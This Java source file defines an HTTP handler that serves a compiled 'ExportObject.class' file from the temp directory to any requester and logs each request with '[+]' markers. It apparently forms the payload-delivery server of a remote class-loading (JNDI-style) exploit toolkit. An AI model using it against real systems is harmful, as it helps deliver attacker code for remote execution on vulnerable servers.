package gds.els.main;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;


public class HttpFileHandler implements HttpHandler {

	private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");
	private static final File TEMP_FILE = new File(TEMP_DIR + File.separator + "ExportObject.class");
	

	public void handle(HttpExchange httpExchange) {

		System.out.println("[+] new http request from " + httpExchange.getRemoteAddress() + " " + httpExchange.getRequestURI());

		try (InputStream inputStream = new FileInputStream(TEMP_FILE) ) {

			System.out.println("[+] serving file: " + TEMP_FILE.getAbsolutePath());

			ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
			while(inputStream.available()>0) {
				byteArrayOutputStream.write(inputStream.read());
			}

			byte[] bytes = byteArrayOutputStream.toByteArray();
			httpExchange.sendResponseHeaders(200, bytes.length);
			httpExchange.getResponseBody().write(bytes);
			httpExchange.close();

		} catch(Exception e) {
			e.printStackTrace();
		}
	}
}
